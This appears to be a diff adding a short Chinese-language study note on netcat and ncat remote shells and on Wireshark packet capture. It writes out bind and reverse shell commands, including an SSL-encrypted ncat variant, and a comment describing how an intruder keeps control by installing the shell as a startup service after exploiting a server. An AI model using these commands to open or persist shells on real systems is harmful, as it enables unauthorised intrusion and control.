@@ -1,0 +1,25 @@
+9月21
+内容1：nc的远程控制
+正向：
+A:nc -lp port -c bash # 获得bash命令权限
+B(监听端):nc -nv IP PORT
+反向：
+A(监听端):nc -lp port
+B:nc -nv IP PORT -c bash
+# windows将bash换成cmd
+# init 6 重启对方服务器
+# 攻击方式：通过检测漏洞的方式进入对方服务器，将nc命令写成脚本通过开启启动的方式作为服务启动，达到即使补上脚本，也可以获得控制权,但是有防火墙，会阻止陌生端口，通常反向比较常用，由内到外访问
+
+内容2：nc的NCAT
+nc的缺点：明文传输
+修改方式：ncat命令,加密传输，ssl证书互换
+安装：apt-get install ncat
+A:ncat -c bash --allow 允许连接B的IP -vnl port --ssl
+B:ncat -nv A的IP PORT --ssl
+# 针对允许IP的连接，可以作为身份IP的验证
+# 不同系统和平台nc参数不同，查阅nc -h来查询
+
+内容3：wireshark
+作用：抓包嗅探协议分析
+工具：linux：Libpcap9   windows：Winpcap10
+使用方法：选择网卡协议，选择过滤方式，保存数据包
